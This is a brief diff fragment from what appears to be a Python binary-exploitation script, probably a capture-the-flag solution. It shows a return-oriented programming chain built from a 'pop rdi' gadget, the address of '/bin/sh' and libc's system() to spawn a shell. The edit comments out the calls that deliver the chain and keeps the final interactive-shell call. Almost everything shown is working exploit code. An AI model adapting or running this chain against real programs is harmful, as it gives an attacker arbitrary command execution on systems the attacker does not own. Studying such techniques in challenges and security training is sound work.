@@ -89,8 +89,8 @@ chain += ptr.p64(next(libc.gadget("pop rdi; ret;")))
 chain += ptr.p64(next(libc.find("/bin/sh")))
 chain += ptr.p64(libc.symbol("system"))
 
-edit(3, 0x100, chain)
-sock.sendline(b"5")
-sock.recvuntil(b"> ")
+# edit(3, 0x100, chain)
+# sock.sendline(b"5")
+# sock.recvuntil(b"> ")
 
 sock.sh()
